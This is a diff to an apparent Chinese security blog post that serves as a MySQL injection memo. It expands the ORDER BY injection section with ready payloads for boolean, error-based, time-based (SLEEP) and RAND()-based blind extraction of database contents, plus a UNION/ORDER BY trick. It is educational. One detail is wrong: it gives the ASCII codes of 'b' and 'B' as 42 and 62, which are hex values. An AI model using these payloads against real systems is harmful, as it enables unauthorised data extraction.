@@ -1,5 +1,5 @@
 ---
-title: MYSQLI总结
+title: MYSQLI备忘录
 date: 2018-04-10 18:19:53
 categories: Web
 tags:
@@ -341,12 +341,129 @@ id=0 UNION SELECT 1,2,3,GROUP_CONCAT(列名) FROM 表名 # 获得数据
 
 <br>
 ## ORDER BY 注入
- - 不能使用联合注入
- - 使用AND
-  - `ORDER BY 1 AND if(ascii(substr(database(),1,1))=114,sleep(5),0)`
-  - `ORDER BY 1 AND updatexml(1,concat(0x7e,version()),1) #`
- - 使用RAND(TRUE/FALSE)---->可能判断不准确
-   - `ORDER BY RAND(if(ascii(substr(database(),1,1))=114,TRUE,FALSE))`
+
+### 判断ORDER BY 注入点
+```
+// 根据IF条件语句判断执行的排序结果
+orderby=IF(3>2,username,password)
+orderby=IF(2>2,username,password)
+
+注意：只能使用username这样的字段名，不能使用 IF(3>2,1,100)
+因为返回内容会判断为字符返回，而不是整数类型
+```
+
+### ORDER BY 盲注
+#### 已知字段名
+```
+利用排序顺序盲注
+
+// IF
+IF((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100, username, password)
+
+// CASE WHEN
+CASE WHEN ((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100) THEN username ELSE password END
+```
+
+
+#### 未知字段名
+在未知字段名的情况下
+
+##### 利用MYSQL报错
+此报错与报错注入的报错不一样，只是在FLASE的时候让语句执行产生错误
+```
+如果条件不满足，触发FALSE，SQL语句会产生错误
+数据库报错信息为： Subquery returns more than 1 row
+
+// IF
+IF((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100, 1, (SELECT 1 FROM information_schema))
+
+// CASE WHEN
+CASE WHEN ((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100) THEN 1 ELSE (SELECT 1 FROM information_schema) END
+
+
+// 可以造成同样的错误
+IF((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100, 1, (SELECT 1 UNION SELECT 2))
+```
+
+##### 利用时间盲注
+```
+// IF
+IF((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))=100, SLEEP(5), 1)
+
+// CASE WHEN
+CASE WHEN ((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100) THEN SLEEP(5) ELSE 1 END
+```
+
+##### 基于RAND()盲注
+```
+RAND(TRUE) // 0.15522042769493574200000
+RAND(FALSE) // 0.40540353712197724200000
+
+// TRUE/FALSE 所返回的内容不同，可以根据排序顺序来判断
+SELECT * FROM users ORDER BY RAND(TRUE/FALSE)
+
+// Payload
+RAND( (SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100 )
+```
+
+#### ORDER BY 报错注入
+如果页面将MYSQL报错信息打印出，可以利用报错注入来获取数据内容
+```
+// 报错注入语句即可
+UPDATEXML(1,CONCAT(1,DATABASE(),1),1)
+```
+
+
+ORDER BY 注入参照文章:
+[MySQL Order By 注入总结](https://www.secpulse.com/archives/57197.html)
+
+#### ORDER BY 一种使用姿势
+结合两位大牛可以这样描述**基于UNION查询的ORDER BY 盲注**
+在不知道某字段列名的情况下，可以利用union与order by来进行盲注
+
+假设以下查询中我们不知道第一个字段名，我们可以利用union插入数据，并利用order by来对不知道字段名的列进行排序
+![injection13](injection13.png)
+
+ - 当host字段回显为2，说明排序在上方，也就是比实际数据要小或等于
+ - 当host字段回显为正常数据，说明排序在下面，也就是比实际数据要大
+
+我们便可以通过这样的比对来获取真正的数据
+同时我们也能观察它们是根据`ASCII`码来进行排序的
+但是这边会出现一个问题，`SELECT 'Bc' UNION SELECT 'b' ORDER BY 1`，`b`和`B`的ASCII码分别为`42`和`62`，但是实际的排序结果如下
+```
++----+
+| Bc |
++----+
+| b  |
+| Bc |
+```
+实际上MYSQL在默认的情况下查询是不区分大小写的,解决办法通常有以下两种
+ - 数据库设计的时候，可能需要大小写敏感，解决方法是建表时候使用BINARY标示。
+ - 使用BINARY关键字
+
+
+**wonderkun师傅也提到利用binary来区别大小写**
+```
+select  'ab'  union select binary 'Ab' order by 1 ;
+
++----+
+| ab |
++----+
+| Ab |
+| ab |
++----+
+```
+
+更具体的实验请看两位师傅的文章，很详细
+[利用order by 进行盲注](http://p0sec.net/index.php/archives/106/)
+[基于union查询的盲注(感谢pcat牛不吝赐教)](http://wonderkun.cc/index.html/?p=547)
+
+
+
+
+
+
+
 
 
 <br>
